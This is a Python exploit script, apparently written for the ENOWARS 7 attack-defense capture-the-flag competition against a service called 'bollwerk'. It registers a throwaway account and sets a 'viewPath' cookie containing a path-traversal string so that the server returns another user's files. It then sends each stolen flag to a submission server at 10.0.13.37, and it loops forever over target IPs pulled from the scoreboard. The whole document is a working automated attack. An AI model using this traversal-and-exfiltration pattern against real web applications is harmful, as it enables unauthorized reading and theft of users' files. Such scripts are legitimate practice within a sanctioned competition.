from pwn import *
import traceback
import requests
import random
import string
from hashlib import md5
import re
import os

def send_flag(flag):
    print('Sending flag:', flag)
    r = remote('10.0.13.37', 1337, level='error')
    r.sendline(flag)
    print(r.recvall(timeout=0.5).decode().split('\n')[-2])
    r.close()

def gen_rand_string():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

def attack(IP, FLAG_STORE):
    url = f'http://{IP}:6009/'

    FLAG_STORE_USER = FLAG_STORE.split(' ')[1]
    FLAG_STORE_TITLE = FLAG_STORE.split(' ')[3]

    s = requests.Session()

    username, password = gen_rand_string(), gen_rand_string()
    r = s.post(url + 'register', data={'username': username, 'password': password})

    s.cookies.set('viewPath', f'../../../../../var/www/html/files/{md5(FLAG_STORE_USER.encode()).hexdigest()}/{FLAG_STORE_TITLE}.md')
    r = s.get(url)

    content = r.text.split('\n')[-1]
    print(content)

    if content.startswith('ENO'):
        send_flag(content)
    else:
        print('[x] Could not get the flag from the content.')
        print(content)


def attack_team():
    attack_list = 'https://7.enowars.com/scoreboard/attack.json'
    attack_data = requests.get(attack_list).json()
    targets = [(ip, ticks) for ip, ticks in attack_data['services']['bollwerk'].items()]

    ip, ticks = random.choice(list(targets))
    for (tick_number, tick_content) in ticks.items():
        print('Attacking team', ip, 'tick', tick_number)
        try:
            attack(ip, tick_content['0'][0])
        except Exception as e:
            print(traceback.format_exc())
            print(e)

while True:
    try:
        attack_team()
    except Exception as e:
        print('Error in main loop.')
        print(e)